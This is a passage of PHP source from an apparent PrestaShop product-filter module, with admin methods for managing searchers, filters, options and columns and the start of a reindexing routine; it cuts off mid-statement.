            'FPP_RM' => Configuration::get('FPP_RM')
        );

        $smarty->assign('paramsBack', $paramsBack);
        $this->_html .= $this->display(__FILE__, $this->name . '_back.tpl');
    }

    /*
     * Funciones para Seacher 
     */

    public function updateSearcher($id_searcher, $internal_name, $public_names, $position, $instant_search, $hide_filter_category, 
            $hide_filter_manufacturer, $hide_filter_supplier, $type_filter_category, $filter_categories, $active) {
        if (empty($internal_name) || empty($public_names) || empty($position))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to update searcher.')));

        $public_names = $this->jsonDecode(str_replace('\"', '"', $public_names), TRUE);
        $id_searcher = !empty($id_searcher) && is_numeric($id_searcher) ? $id_searcher : NULL;
        
        $SearcherClass = new SearcherClass($id_searcher);

        $SearcherClass->internal_name = $internal_name;
        $SearcherClass->position = $position;
        $SearcherClass->instant_search = $instant_search;
        $SearcherClass->hide_filter_category = ($hide_filter_category == 1 ? TRUE : FALSE);
        $SearcherClass->hide_filter_manufacturer = ($hide_filter_manufacturer == 1 ? TRUE : FALSE);
        $SearcherClass->hide_filter_supplier = ($hide_filter_supplier == 1 ? TRUE : FALSE);
        $SearcherClass->type_filter_category = $type_filter_category;
        $SearcherClass->filter_categories = $filter_categories;
        $SearcherClass->active = ($active == 1 ? TRUE : FALSE);
        $SearcherClass->name = $public_names;
        
        if ($SearcherClass->save())
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The searcher was successfully updated.')));
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to update.')));
    }

    public function deleteSearcher($id_searcher) {
        if (empty($id_searcher))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to delete the searcher.')));

        $SearcherClass = new SearcherClass($id_searcher);

        if (Validate::isLoadedObject($SearcherClass)) {
            if ($SearcherClass->delete())
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The searcher was successfully deleted.')));
            else
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to delete.')));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to delete.')));
    }

    public function loadSearcher($id_searcher) {
        if (empty($id_searcher))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to load searcher.')));

        $SearcherClass = new SearcherClass($id_searcher);

        if (Validate::isLoadedObject($SearcherClass)) {
            return $this->jsonEncode(array(
                        'message_code' => VAR_FILTERPRODUCTSPRO_EXITO,
                        'data' => array(
                            'internal_name' => $SearcherClass->internal_name,
                            'position' => $SearcherClass->position,
                            'instant_search' => $SearcherClass->instant_search,
                            'hide_filter_category' => $SearcherClass->hide_filter_category,
                            'hide_filter_manufacturer' => $SearcherClass->hide_filter_manufacturer,
                            'hide_filter_supplier' => $SearcherClass->hide_filter_supplier,
                            'type_filter_category' => $SearcherClass->type_filter_category,
                            'filter_categories' => $SearcherClass->filter_categories,
                            'active' => $SearcherClass->active,
                            'names' => $SearcherClass->name
                        )
                    ));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to load searcher.')));
    }
    
    public function sortOptionsFilter($id_filter, $sort_asc = 'true') {
        $query = 'SELECT id_option_criterion FROM ' . _DB_PREFIX_ . 'fpp_option '
            . 'WHERE id_filter = ' . $id_filter;
        $result = Db::getInstance()->executeS($query);
        $ids_criterion = array();
        foreach ($result AS $criterion) {
            $ids_criterion[] = $criterion['id_option_criterion'];
        }
        
        $query_value = 'SELECT `value`, id_lang, id_option_criterion '
            . 'FROM  ' . _DB_PREFIX_ . 'fpp_option_criterion_lang '
            . 'WHERE id_option_criterion IN (' . implode(',', $ids_criterion) . ')';
        
        $result_value = Db::getInstance()->executeS($query_value);
        
        $values = array();
        foreach ($result_value AS $_r) {
            if (!array_key_exists($_r['id_lang'], $values)) {
                $values[$_r['id_lang']] = array();
            }
            
            $values[$_r['id_lang']][$_r['id_option_criterion']] = $_r['value'];
            
        }
        
        foreach ($values AS $value) {
            $aux = $value;
            if ($sort_asc == 'true') 
                asort($aux);
            else 
                arsort($aux);
                    
            $position = 1;
            foreach ($aux AS $key => $val) {
                
                $query_update = 'UPDATE ' . _DB_PREFIX_ . 'fpp_option SET position = ' . $position 
                        . ' WHERE id_filter = ' . $id_filter 
                        . ' AND id_option_criterion = ' . $key;
                
                Db::getInstance()->execute($query_update);
                
                $position++;
            }
        }
        
        return array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO);
    }

    public function getSearchersList() {
        $defaultLanguage = intval(Configuration::get('PS_LANG_DEFAULT'));

        $searchers_list = SearcherClass::getSearchers($this->id_lang);

        return $this->jsonEncode(array(
                    'message_code' => VAR_FILTERPRODUCTSPRO_EXITO,
                    'data' => $searchers_list
                ));
    }

    /*
     * Funciones para Filtros y Opciones
     */

    public function updateFilter($id_filter, $id_searcher, $names, $criterion, $type, $multi_option, $level_depth, $num_columns = 1, $search_ps = 0, $categories_selected = array(), $id_parent = 0, $position = 0, $active = 1, $id_filter_custom_clone = 0) {
        if (empty($id_searcher) || empty($names) || empty($criterion) || empty($type) || !in_array($multi_option, array(0, 1)) || empty($categories_selected) || !is_array($categories_selected) || !sizeof($categories_selected))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to update filter.')));

        $names = $this->jsonDecode(str_replace('\"', '"', $names), TRUE);
        if ($type == $this->GLOBAL->Types->Select)
            $multi_option = 0;
                        
        if (empty($id_filter)) {//ADD
            $FilterClass = new FilterClass();

            $FilterClass->id_searcher = $id_searcher;
            $FilterClass->name = $names;
            $FilterClass->criterion = $criterion;
            $FilterClass->position = $position;
            $FilterClass->type = $type;
            $FilterClass->multi_options = $multi_option;
            $FilterClass->level_depth = $level_depth;
            $FilterClass->id_parent = $id_parent;
            $FilterClass->num_columns = $num_columns;
            $FilterClass->search_ps = $search_ps;
            $FilterClass->active = ($active == 1 ? TRUE : FALSE);

            if ($FilterClass->add()) {
                //Crear columnas para el filtro, siempre y cuando sea mas de 1
                $values_column = $this->getEmptyValuesLang('');
                if ($FilterClass->num_columns > 1) {
                    for ($it = 1; $it <= $FilterClass->num_columns; $it++) {
                        $ColumnClass = new ColumnClass();

                        $ColumnClass->position = $it;
                        $ColumnClass->id_filter = $FilterClass->id;
                        $ColumnClass->value = $values_column;

                        if (!$ColumnClass->add())
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to save columns.')));
                    }
                }

                if ($criterion == $this->GLOBAL->Criterions->Category) {
                    $criterions_by_table = OptionCriterionClass::getOptionsCriterionsByIdTable($this->GLOBAL->Criterions->Category, $categories_selected);
                    
                    if (!$this->fillCategoriesSelected($FilterClass->id, $categories_selected, TRUE))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to save categories for filter.')));

                    if (!$this->fillOptionsToUpdate($criterions_by_table, $FilterClass, 'Category'))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to save options.')));

                    if (!$this->indexProductsForCategory($FilterClass->id))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying index products.')));
                }
                elseif ($criterion == $this->GLOBAL->Criterions->Feature) {
                    $criterions_by_feature = OptionCriterionClass::getOptionsCriterionsByLevelDepth(array($this->GLOBAL->Criterions->Feature), array($level_depth));

                    if (!$this->fillOptionsToUpdate($criterions_by_feature, $FilterClass))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to save options.')));

                    if (!$this->indexProductsForFeature($FilterClass->id))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying index products.')));
                }
                elseif ($criterion == $this->GLOBAL->Criterions->Attribute) {
                    $criterions_by_attribute = OptionCriterionClass::getOptionsCriterionsByLevelDepth(array($this->GLOBAL->Criterions->Attribute), array($level_depth));

                    if (!$this->fillOptionsToUpdate($criterions_by_attribute, $FilterClass))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to save options.')));

                    if (!$this->indexProductsForAttribute($FilterClass->id))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying index products.')));
                }
                elseif ($criterion == $this->GLOBAL->Criterions->Manufacturer) {
                    $criterions_by_manufacturer = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Manufacturer);

                    if (!$this->fillOptionsToUpdate($criterions_by_manufacturer, $FilterClass, 'Manufacturer'))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to save options.')));

                    if (!$this->indexProductsForManufacturer($FilterClass->id))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying index products.')));
                }
                elseif ($criterion == $this->GLOBAL->Criterions->Supplier) {
                    $criterions_by_supplier = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Supplier);

                    if (!$this->fillOptionsToUpdate($criterions_by_supplier, $FilterClass, 'Supplier'))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to save options.')));

                    if (!$this->indexProductsForSupplier($FilterClass->id))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying index products.')));
                }
                elseif ($criterion == $this->GLOBAL->Criterions->Price) {
                    $criterions_by_price = OptionCriterionClass::getOptionsCriterionByCriterion($this->GLOBAL->Criterions->Price);

                    if (!$this->fillOptionsToUpdate($criterions_by_price, $FilterClass))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to save options.')));

                    if (!$this->indexProductsForPrice($FilterClass->id))
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying index products.')));
                }elseif ($criterion == $this->GLOBAL->Criterions->Custom && !empty($id_filter_custom_clone)) {
                    //clonamos las optiones del filtro enviado como base.
                    $filter_base = new FilterClass($id_filter_custom_clone);
                    
                    if (Validate::isLoadedObject($filter_base)){
                        $options = Db::getInstance()->ExecuteS('SELECT * FROM ' . _DB_PREFIX_ .'fpp_option WHERE id_filter = ' . $filter_base->id);
                        foreach ($options AS $option){
                            $OptionCriterionClass = new OptionCriterionClass((int)$option['id_option_criterion']);
                            
                            if(Validate::isLoadedObject($OptionCriterionClass)){
                                $OptionCriterionClass->id = NULL;
                                
                                if ($OptionCriterionClass->add()) {
                                    $OptionClass = new OptionClass((int)$option['id_option']);
                                    
                                    if(Validate::isLoadedObject($OptionClass)){
                                        $OptionClass->id = NULL;
                                        $OptionClass->id_filter = $FilterClass->id;
                                        $OptionClass->id_option_criterion = $OptionCriterionClass->id;
                                        
                                        $OptionClass->add();
                                    }
                                }
                            }                                                                
                        }
                    }
                }

                return $this->jsonEncode(array(
                            'message_code' => VAR_FILTERPRODUCTSPRO_EXITO,
                            'message' => $this->l('The filter was successfully saved.'),
                            'data' => array(
                                'id' => $FilterClass->id
                            )
                        ));
            }
            else
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to save.')));
        }
        else {//UPDATE
            $FilterClass = new FilterClass($id_filter);

            $FilterClass->name = $names;
            $FilterClass->type = $type;
            $FilterClass->search_ps = $search_ps;
            $FilterClass->multi_options = $multi_option;

            if ($FilterClass->update()){                
                return $this->jsonEncode(array(
                            'message_code' => VAR_FILTERPRODUCTSPRO_EXITO,
                            'message' => $this->l('The filter was successfully updated.'),
                            'data' => array(
                                'id' => $FilterClass->id
                            )
                        ));
            }
            else
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to update.')));
        }
    }

    private function fillOptionsToUpdate($options_criterion, &$FilterClass, $_class = NULL) {
        $aux_position = 1;
        foreach ($options_criterion as $option_criterion) {
            $OptionClass = new OptionClass();

            $active = TRUE;
            if (!empty($_class)) {
                $Class = new $_class($option_criterion['id_table']);
                if (!empty($Class) && Validate::isLoadedObject($Class) && isset($Class->active))
                    $active = $Class->active;
            }

            $OptionClass->id_filter = $FilterClass->id;
            $OptionClass->position = $aux_position++;
            $OptionClass->active = $active;
            $OptionClass->id_option_criterion = (int) $option_criterion['id_option_criterion'];

            if (!$OptionClass->add())
                return FALSE;
        }

        return TRUE;
    }
    
    private function fillCategoriesSelected($id_filter = 0, $categories = array(), $truncate = false){
        if($truncate)
            if(!Db::getInstance()->Execute("DELETE FROM " . _DB_PREFIX_ . "fpp_filter_category WHERE id_filter = " . (int)$id_filter))
                return false;
            
        foreach ($categories as $id_category) {
            $row = array(
                'id_filter' => (int)$id_filter,
                'id_category' => (int)$id_category
            );

            if (!Db::getInstance()->AutoExecute(_DB_PREFIX_ . 'fpp_filter_category', $row, 'INSERT'))
                return FALSE;
        }
        
        return TRUE;
    }
    
    private function getCategoriesSelectedByFilter($id_filter = 0){
        return Db::getInstance()->ExecuteS("
            SELECT
                *
            FROM 
                " . _DB_PREFIX_ . "fpp_filter_category
            WHERE 
                id_filter = " . (int)$id_filter . "
        ");
    }

    public function getFiltersListBySearcher($id_searcher) {
        if (empty($id_searcher))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve filters list.')));

        $defaultLanguage = intval(Configuration::get('PS_LANG_DEFAULT'));

        $filters_list = FilterClass::getFiltersListBySearcher($this->id_lang, $id_searcher);

        return $this->jsonEncode(array(
                    'message_code' => VAR_FILTERPRODUCTSPRO_EXITO,
                    'data' => $filters_list
                ));
    }

    public function updateFiltersPosition($order_filters) {
        if (empty($order_filters))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update filters position.')));

        $defaultLanguage = intval(Configuration::get('PS_LANG_DEFAULT'));
        $order_filters = explode(',', $order_filters);
        $position = 1;
        $errors = array();
        $success = VAR_FILTERPRODUCTSPRO_EXITO;

        foreach ($order_filters as $id_filter) {
            $FilterClass = new FilterClass($id_filter);

            $FilterClass->position = $position;

            if (!$FilterClass->update()) {
                $errors[] = $this->l('Error to update position for filter') . ': ' . $FilterClass->name[$this->id_lang];
                $success = VAR_FILTERPRODUCTSPRO_ERROR;
            }

            $position++;
        }

        return $this->jsonEncode(array(
                    'message_code' => $success,
                    'errors' => $errors
                ));
    }

    public function loadFilter($id_filter) {
        if (empty($id_filter))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to load filter.')));

        $FilterClass = new FilterClass($id_filter);

        self::$_dependencies = array();
        self::getRecursiveDependencies($FilterClass->id);

        if (Validate::isLoadedObject($FilterClass)) {
            $categories_selected = $this->getCategoriesSelectedByFilter($FilterClass->id);
            
            return $this->jsonEncode(array(
                        'message_code' => VAR_FILTERPRODUCTSPRO_EXITO,
                        'data' => array(
                            'id_searcher' => $FilterClass->id_searcher,
                            'names' => $FilterClass->name,
                            'criterion' => $FilterClass->criterion,
                            'position' => $FilterClass->position,
                            'type' => $FilterClass->type,
                            'multi_options' => (int) $FilterClass->multi_options,
                            'level_depth' => (int) $FilterClass->level_depth,
                            'id_parent' => (int) $FilterClass->id_parent,
                            'num_columns' => (int) $FilterClass->num_columns,
                            'search_ps' => (int) $FilterClass->search_ps,
                            'active' => (int) $FilterClass->active,
                            'has_dependencies' => (sizeof(self::$_dependencies) ? TRUE : ($FilterClass->id_parent != 0 ? TRUE : FALSE)),
                            'categories_selected' => $categories_selected
                        )
                    ));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to load filter.')));
    }

    public function deleteFilter($id_filter) {
        if (empty($id_filter))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to delete the filter.')));

        $FilterClass = new FilterClass($id_filter);

        if (Validate::isLoadedObject($FilterClass)) {
            if ($FilterClass->delete() && FilterClass::deleteOptionsByFilter($id_filter))
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The filter was successfully deleted.')));
            else
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to delete.')));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to delete.')));
    }

    public function activeFilter($id_filter, $active) {
        if (empty($id_filter) || !in_array($active, array(0, 1)))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to active the filter.')));

        $FilterClass = new FilterClass($id_filter);

        if (Validate::isLoadedObject($FilterClass)) {
            $FilterClass->active = ($active == 1 ? TRUE : FALSE);

            if ($FilterClass->update())
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The filter was successfully updated.')));
            else
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to updated.')));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to updated.')));
    }

    /*
     * Opciones
     */

    public function getOptionsByFilter($id_filter) {
        global $cookie;
        
        if (empty($id_filter))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve options list.')));

        $defaultLanguage = intval(Configuration::get('PS_LANG_DEFAULT'));
        
        $FilterClass = new FilterClass($id_filter);
        
        if (($FilterClass->level_depth == 0 || $FilterClass->level_depth == -1) || (isset($_POST['dependencies'])) && $_POST['dependencies'] == 0 ){
            $options_list = OptionClass::getOptionListByFilter($this->id_lang, $FilterClass->id);
            $count_options = OptionClass::getOptionListByFilter($this->id_lang, $FilterClass->id, NULL, TRUE);
        }else{
            $options_list = OptionClass::getOptionListByFilterDependency($this->id_lang, $FilterClass->id, NULL, FALSE, TRUE);
            $count_options = OptionClass::getOptionListByFilterDependency($this->id_lang, $FilterClass->id, NULL, TRUE);
        }

        $columns = FilterClass::getColumns($id_filter);

        //Si la cantidad de columnas que arroja el array {$columns} es diferente a la propiedad {$FilterClass->num_columns} hay un error, tienen que ser iguales
        if ($FilterClass->num_columns > 1 && sizeof($columns) != $FilterClass->num_columns)
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('The quantity of columns is no valid')));

        $ids_columns = array();
        $options_by_column = array();
        $values_by_column = array();

        foreach ($columns as $col) {
            $id_column = (int) $col['id_column'];
            $options_column = ColumnOptionClass::getOptionsByColumn($id_column);

            $ColumnClass = new ColumnClass($id_column);
            if (!Validate::isLoadedObject($ColumnClass))
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('Error to retrieve values for column')));

            $values_by_column[$id_column] = $ColumnClass->value;

            foreach ($options_column as $option) {
                $options_by_column[$id_column][] = $option['id_option'];
            }

            array_push($ids_columns, $id_column);
        }
        
        $filter_is_last_dependency = Db::getInstance()->ExecuteS('
            SELECT * FROM 
                '._DB_PREFIX_.'fpp_filter 
            WHERE 
                id_parent = ' .$FilterClass->id . ' AND
                criterion = "'. $this->GLOBAL->Criterions->Custom .'"
            ') ? false : true;

        return $this->jsonEncode(array(
                    'message_code' => VAR_FILTERPRODUCTSPRO_EXITO,
                    'data' => array(
                        'count_options' => $count_options,
                        'options' => $options_list,
                        'filter' => array(
                            'criterion' => $FilterClass->criterion,
                            'num_columns' => $FilterClass->num_columns,
                            'ids_columns' => $ids_columns,
                            'options_by_column' => $options_by_column,
                            'values_by_column' => $values_by_column,
                            'is_last_dependency' => $filter_is_last_dependency,
                            'is_parent' => ($FilterClass->level_depth == 0 || $FilterClass->level_depth == -1 ? true : false)
                        )
                    )
                ));
    }

    public function activeOption($id_option, $active) {
        if (empty($id_option) || !in_array($active, array(0, 1)))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to active the option.')));

        $OptionClass = new OptionClass($id_option);

        if (Validate::isLoadedObject($OptionClass)) {
            $OptionClass->active = ($active == 1 ? TRUE : FALSE);

            if ($OptionClass->update())
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The option was successfully updated.')));
            else
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to updated.')));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to updated.')));
    }

    public function updateOptionsPosition($order_options) {
        if (empty($order_options))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update options position.')));

        $defaultLanguage = intval(Configuration::get('PS_LANG_DEFAULT'));
        $order_options = explode(',', $order_options);
        $position = 1;
        $errors = array();
        $success = VAR_FILTERPRODUCTSPRO_EXITO;

        foreach ($order_options as $id_option) {
            $OptionClass = new OptionClass($id_option);

            if (!ColumnOptionClass::deletePositionByOption($id_option))
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('Error to delete position for option') . ': ' . $OptionClass->value[$this->id_lang]));

            $OptionClass->position = $position;

            if (!$OptionClass->update()) {
                $errors[] = $this->l('Error to update position for option') . ': ' . $OptionClass->value[$this->id_lang];
                $success = VAR_FILTERPRODUCTSPRO_ERROR;
            }

            $position++;
        }

        return $this->jsonEncode(array(
                    'message_code' => $success,
                    'errors' => $errors
                ));
    }

    public function updateOptionsColumnPosition($order_options_column, $id_col) {
        if (empty($order_options_column) || !is_numeric($id_col))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update options position.')));

        $order_options_column = explode(',', $order_options_column);
        $position = 1;
        $errors = array();
        $success = VAR_FILTERPRODUCTSPRO_EXITO;

        //Eliminar las posiciones registradas
        if (!ColumnOptionClass::deleteAllPositionsByColumn($id_col))
            return $this->jsonEncode(array(
                        'message_code' => $success,
                        'errors' => array($this->l('Error to delete the positions for column'))
                    ));

        foreach ($order_options_column as $id_option) {
            if (!ColumnOptionClass::deletePositionByOption($id_option))
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('Error to delete position for option')));

            $ColumnOptionClass = new ColumnOptionClass();

            $ColumnOptionClass->id_option = $id_option;
            $ColumnOptionClass->id_column = $id_col;
            $ColumnOptionClass->position = $position;

            if (!$ColumnOptionClass->add()) {
                $errors[] = $this->l('Error to update position for column');
                $success = VAR_FILTERPRODUCTSPRO_ERROR;
            }

            $position++;
        }

        return $this->jsonEncode(array(
                    'message_code' => $success,
                    'errors' => $errors
                ));
    }

    public function updateValuesColumn($id_col, $values) {
        if (empty($id_col) || empty($values))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update values for the column.')));

        $values = $this->jsonDecode(str_replace('\"', '"', $values), TRUE);

        $ColumnClass = new ColumnClass($id_col);

        if (Validate::isLoadedObject($ColumnClass)) {
            $ColumnClass->value = $values;

            if ($ColumnClass->update())
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('The value for the column was successfully updated.')));
            else
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to updated.')));
        }
        else
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying to updated.')));
    }

    public function reindexByFilter($id_filter) {
        if (empty($id_filter))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying reindex data.')));

        $FilterClass = new FilterClass($id_filter);

        if (Validate::isLoadedObject($FilterClass)) {
            if ($FilterClass->criterion == $this->GLOBAL->Criterions->Category) {
                //Retonar exito aunque no se lleve a cabo la operacion
                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('Process completed successfully.')));
                
                //Listado de todas las categorias
                $all_categories = Db::getInstance()->ExecuteS("SELECT * FROM " . _DB_PREFIX_ . "category WHERE level_depth = " . $FilterClass->level_depth);

                //{Option Criterion} creados al instalar
                $options_criterion = OptionCriterionClass::getOptionsCriterionsByLevelDepth(array($this->GLOBAL->Criterions->Category), array($FilterClass->level_depth));

                //Obtener los {id}({id_table}) de {categorias}
                $ids_categories = array();
                //Almacenar el {id_option_criterion} en un array asociativo donde la llave es {id_table}, en este caso {id_category}
                $id_category_option_criterion = array();
                foreach ($options_criterion as $option_criterion) {
                    $ids_categories[$option_criterion['id_table']] = $option_criterion['id_table'];
                    $id_category_option_criterion[$option_criterion['id_table']] = $option_criterion['id_option_criterion'];
                }

                //Listado de {ids} de {option_criterion} que fueron creados, mas no actualizados
                $ids_option_criterions_add = array();
                //Listado de {categories} agrupadas por {id_option_criterion}
                $categories_by_option_criterion = array();

                //Crear o actualizar el {option_criterion}
                foreach ($all_categories as $category) {
                    $id_category = $category['id_category'];
                    //Load de {category} para llenar el campo {value}
                    $Category = new Category($id_category);

                    $id_option_criterion = isset($id_category_option_criterion[$id_category]) ? $id_category_option_criterion[$id_category] : NULL;

                    $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);
                    $OptionCriterionClass->value = $Category->name;
                    $OptionCriterionClass->id_table = $Category->id;
                    $OptionCriterionClass->criterion = $this->GLOBAL->Criterions->Category;
                    $OptionCriterionClass->level_depth = $Category->level_depth;
                    
                    if (!$OptionCriterionClass->validateFieldsLang(false, true))
                        continue;
                    
                    if (is_array($OptionCriterionClass->value) && 
                        sizeof($OptionCriterionClass->value) && 
                        empty($OptionCriterionClass->value[Configuration::get('PS_LANG_DEFAULT')])
                    )
                        continue;

                    //Obtener las opciones que estan asociadas con el {option_criterion} para actualizar el campo {active}
                    if (!is_null($id_option_criterion)) {
                        $options = OptionClass::getOptionsByIdOptionCriterion($id_option_criterion);

                        foreach ($options as $option) {
                            $OptionClass = new OptionClass($option['id_option']);

                            if (Validate::isLoadedObject($OptionClass)) {
                                if ($OptionClass->active && !$Category->active) {
                                    $OptionClass->active = FALSE;

                                    if (!$OptionClass->update())
                                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update option.')));
                                }
                            }
                            else
                                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying update option.')));
                        }
                    }

                    if (!$OptionCriterionClass->save())
                        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save option criterion.')));

                    if (is_null($id_option_criterion)) {
                        array_push($ids_option_criterions_add, $OptionCriterionClass->id);
                        $categories_by_option_criterion[$OptionCriterionClass->id] = array(
                            'active' => $Category->active
                        );
                    }

                    if (array_key_exists($id_category, $ids_categories))
                        unset($ids_categories[$id_category]);
                }

                //Crear nuevas opciones para cada filtro
                if (!$this->fillNewOptionsForFiltersToReindex($ids_option_criterions_add, $this->GLOBAL->Criterions->Category, NULL, $categories_by_option_criterion))
                    return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying save new option.')));

                //Remover los {option_criterion} que no se encontraron
                //Remover las {option} asociadas al {option_criterion}
                foreach ($ids_categories as $id_category => $value) {
                    $id_option_criterion = $id_category_option_criterion[$id_category];

                    $OptionCriterionClass = new OptionCriterionClass($id_option_criterion);

                    if (Validate::isLoadedObject($OptionCriterionClass)) {
                        if (!$OptionCriterionClass->delete())
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete option.')));

                        if (!OptionClass::deleteOptionsByIdOptionCriterion($id_option_criterion))
                            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying delete the options.')));
                    }
                }

                return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'message' => $this->l('Process completed successfully.')));
            }
            elseif ($FilterClass->criterion == $this->GLOBAL->Criterions->Feature) {
                //Listado de todas las caracteristicas
                $all_features_value = Db::getInstance()->ExecuteS("
